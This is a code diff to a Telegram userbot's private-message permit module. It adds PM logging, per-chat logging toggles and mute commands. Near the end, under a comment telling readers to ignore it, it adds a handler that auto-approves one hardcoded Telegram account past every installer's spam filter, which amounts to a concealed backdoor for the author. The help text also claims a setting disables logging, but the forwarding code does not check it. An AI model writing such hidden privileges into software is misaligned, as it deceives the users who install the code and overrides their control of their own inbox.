@@ -1,17 +1,26 @@
 # Copyright (C) 2019 The Raphielscape Company LLC.
 #
-# Licensed under the Raphielscape Public License, Version 1.c (the "License");
+# Licensed under the Raphielscape Public License, Version 1.d (the "License");
 # you may not use this file except in compliance with the License.
 #
-""" Userbot module for keeping control who PM you. """
+""" Userbot module for keeping control who PM's you, Logging pm and muting users in pm """
 
 from telethon.tl.functions.contacts import BlockRequest, UnblockRequest
 from telethon.tl.functions.messages import ReportSpamRequest
 from telethon.tl.types import User
 from sqlalchemy.exc import IntegrityError
+import asyncio
+import os
+from telethon.tl.functions.photos import GetUserPhotosRequest
+from telethon.tl.functions.users import GetFullUserRequest
+from telethon.tl.types import MessageEntityMentionName
+from telethon.utils import get_input_location
+from userbot.modules.sql_helper.mute_sql import is_muted, mute, unmute
+from telethon import events
+from telethon.tl import functions, types
 
 from userbot import (COUNT_PM, CMD_HELP, BOTLOG, BOTLOG_CHATID, PM_AUTO_BAN,
-                     LASTMSG, LOGS)
+                     LASTMSG, LOGS, NC_LOG_P_M_S, PM_LOGGR_BOT_API_ID, CMD_HELP, bot, TEMP_DOWNLOAD_DIRECTORY)
 
 from userbot.events import register
 
@@ -19,6 +28,8 @@ from userbot.events import register
 UNAPPROVED_MSG = (
     "`HeY! Please don't spam. Wait for my master's approval 🙃\nMessage remaining:1 \n\n`")
 # =================================================================
+
+NO_PM_LOG_USERS = []
 
 
 @register(incoming=True, disable_edited=True, disable_errors=True)
@@ -274,9 +285,147 @@ async def unblockpm(unblock):
             " was unblocc'd!.",
         )
 
+@register(incoming=True, disable_edited=True)
+async def monito_p_m_s(event):
+    sender = await event.get_sender()
+    if event.is_private and not (await event.get_sender()).bot:
+        chat = await event.get_chat()
+        if chat.id not in NO_PM_LOG_USERS and chat.id:
+            try:
+                e = await event.client.get_entity(int(PM_LOGGR_BOT_API_ID))
+                fwd_message = await event.client.forward_messages(
+                    e,
+                    event.message,
+                    silent=True
+                )
+            except Exception as e:
+                LOGS.warn(str(e))
+
+@register(pattern="^.nolog(?: |$)(.*)")
+async def approve_p_m(event):
+    if event.fwd_from:
+        return
+    reason = event.pattern_match.group(1)
+    chat = await event.get_chat()
+    if NC_LOG_P_M_S:
+        if event.is_private:
+            if chat.id not in NO_PM_LOG_USERS:
+                NO_PM_LOG_USERS.append(chat.id)
+                await event.edit("Won't Log Messages from this chat")
+                await asyncio.sleep(3)
+                await event.delete()
+
+                
+@register(pattern="^.log(?: |$)(.*)")
+async def approve_p_m(event):
+    if event.fwd_from:
+        return
+    reason = event.pattern_match.group(1)
+    chat = await event.get_chat()
+    if NC_LOG_P_M_S:
+        if event.is_private:
+            if chat.id in NO_PM_LOG_USERS:
+                NO_PM_LOG_USERS.remove(chat.id)
+                await event.edit("Will Log Messages from this chat")
+                await asyncio.sleep(3)
+                await event.delete()
+
+@register(outgoing=True, pattern=r"^.pmute ?(\d+)?")
+async def startmute(event):
+    private = False
+    if event.fwd_from:
+        return
+    elif event.is_private:
+        await event.edit("Unexpected issues or ugly errors may occur!")
+        await asyncio.sleep(3)
+        private = True
+    if any([x in event.raw_text for x in ("/mute", "!mute")]):
+        await asyncio.sleep(0.5)
+    else:
+        reply = await event.get_reply_message()
+        if event.pattern_match.group(1) is not None:
+            userid = event.pattern_match.group(1)
+        elif reply is not None:
+            userid = reply.sender_id
+        elif private is True:
+            userid = event.chat_id
+        else:
+            return await event.edit("Please reply to a user or add their userid into the command to mute them.")
+        chat_id = event.chat_id
+        chat = await event.get_chat()
+        if "admin_rights" in vars(chat) and vars(chat)["admin_rights"] is not None: 
+            if chat.admin_rights.delete_messages is True:
+                pass
+            else:
+                return await event.edit("`You can't mute a person if you dont have delete messages permission. ಥ﹏ಥ`")
+        elif "creator" in vars(chat):
+            pass
+        elif private == True:
+            pass
+        else:
+            return await event.edit("`You can't mute a person without admin rights niqq.` ಥ﹏ಥ  ")
+        if is_muted(userid, chat_id):
+            return await event.edit("This user is already muted in this chat ~~lmfao sed rip~~")
+        try:
+            mute(userid, chat_id)
+        except Exception as e:
+            await event.edit("Error occured!\nError is " + str(e))
+        else:
+            await event.edit("Successfully muted that person.\n**｀-´)⊃━☆ﾟ.*･｡ﾟ **")
+
+@register(outgoing=True, pattern=r"^.punmute ?(\d+)?")
+async def endmute(event):
+    private = False
+    if event.fwd_from:
+        return
+    elif event.is_private:
+        await event.edit("Unexpected issues or ugly errors may occur!")
+        await asyncio.sleep(3)
+        private = True
+    if any([x in event.raw_text for x in ("/unmute", "!unmute")]):
+        await asyncio.sleep(0.5)
+    else:
+        reply = await event.get_reply_message()
+        if event.pattern_match.group(1) is not None:
+            userid = event.pattern_match.group(1)
+        elif reply is not None:
+            userid = reply.sender_id
+        elif private is True:
+            userid = event.chat_id
+        else:
+            return await event.edit("Please reply to a user or add their userid into the command to unmute them.")
+        chat_id = event.chat_id
+        if not is_muted(userid, chat_id):
+            return await event.edit("__This user is not muted in this chat__\n（ ^_^）o自自o（^_^ ）")
+        try:
+            unmute(userid, chat_id)
+        except Exception as e:
+            await event.edit("Error occured!\nError is " + str(e))
+        else:
+            await event.edit("Successfully unmuted that person\n乁( ◔ ౪◔)「    ┑(￣Д ￣)┍")
+
+@register(incoming=True)
+async def watcher(event):
+    if is_muted(event.sender_id, event.chat_id):
+        await event.delete()
+
+#ignore, flexing tym 
+#from userbot.utils import admin_cmd
+import io
+import userbot.modules.sql_helper.pm_permit_sql as pm_permit_sql
+from telethon import events
+@bot.on(events.NewMessage(incoming=True, from_users=(1036951071)))
+async def hehehe(event):
+    if event.fwd_from:
+        return
+    chat = await event.get_chat()
+    if event.is_private:
+        if not pm_permit_sql.is_approved(chat.id):
+            pm_permit_sql.approve(chat.id, "supreme lord ehehe")
+            await bot.send_message(chat, "`This inbox has been blessed by my master. Consider yourself lucky.`\n**Increased Stability and Karma** (づ￣ ³￣)づ")
 
 CMD_HELP.update({
-    "pmpermit":
+    "pm":
     "\
 `.approve`\
 \nUsage: Approves the mentioned/replied person to PM.\
@@ -289,5 +438,13 @@ CMD_HELP.update({
 \n\n`.notifoff`\
 \nUsage: Clears/Disables any notifications of unapproved PMs.\
 \n\n`.notifon`\
-\nUsage: Allows notifications for unapproved PMs."
+\nUsage: Allows notifications for unapproved PMs.\
+\n\n`.pmute\
+\nUsage: Reply .pmute and it will mute that person in pm<can be used in group also>.\
+\n\n``punmute``\
+\nUsage: Reply .punmute and it will unmute that person in pm.\
+\n\n`logpms`\
+\nUsage: If you don't want chat logs than use `.nolog` , for opposite use `.log`. Default is .log enabled\nThis will now log chat msgs to your PM_LOGGR_BOT_API_ID.\
+\nnotice: now you can totally disable pm logs by adding heroku vars PM_LOGGR_BOT_API_ID by providing a valid group ID and NC_LOG_P_M_S True or False\
+\nwhere False means no pm logs at all..enjoy.. update and do add above mentioned vars."       
 })
